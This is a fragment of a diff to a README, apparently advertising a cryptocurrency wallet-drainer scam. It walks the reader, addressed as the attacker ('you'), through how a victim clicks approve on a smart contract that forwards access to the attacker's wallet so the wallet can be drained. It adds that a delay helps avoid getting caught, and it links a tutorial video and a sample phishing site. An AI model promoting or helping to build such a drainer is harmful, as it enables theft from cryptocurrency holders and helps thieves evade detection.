@@ -37,13 +37,15 @@ Steps that the !!! victim !!! has to do
 
 2.Click approve
 
-3.Smart contract gets approved then it will foward the data to the attackers wallet (you)
+3.Smart contract gets approved then it will foward the data to the attackers wallet (you) 
 
 4.Drain wallet
 
 Smart contract
 
 1. the smart contract will foward the data to you to prevent you from being caught 
+
+3. the contract has a 2 hour on average delay for added security
 
 youtube tutorial https://www.youtube.com/watch?v=SnDlcDBAjso
 sample site https://busdminer.netlify.app/
